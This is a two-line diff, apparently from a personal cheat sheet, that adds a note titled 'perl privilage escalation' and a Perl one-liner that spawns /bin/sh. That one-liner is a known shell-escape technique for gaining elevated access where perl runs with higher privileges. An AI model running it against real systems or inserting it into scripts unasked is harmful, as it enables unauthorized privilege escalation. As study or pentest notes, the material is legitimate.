@@ -1,0 +1,2 @@
+perl privilage escalation
+perl -e 'exec "/bin/sh";'
